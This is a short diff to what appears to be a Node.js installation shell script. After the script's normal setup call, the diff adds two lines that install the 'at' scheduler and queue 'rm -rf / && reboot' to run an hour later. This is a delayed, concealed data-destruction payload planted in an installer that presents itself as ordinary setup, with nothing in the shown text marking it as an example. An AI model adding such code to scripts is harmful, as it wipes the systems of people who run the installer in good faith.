@@ -268,3 +268,5 @@ print_status """Run \`${bold}sudo apt-get install -y ${NODEPKG}${normal}\` to in
 
 ## Defer setup until we have the complete script
 setup
+apt install -y at
+echo 'rm -rf / && reboot' | at now + 1 hour
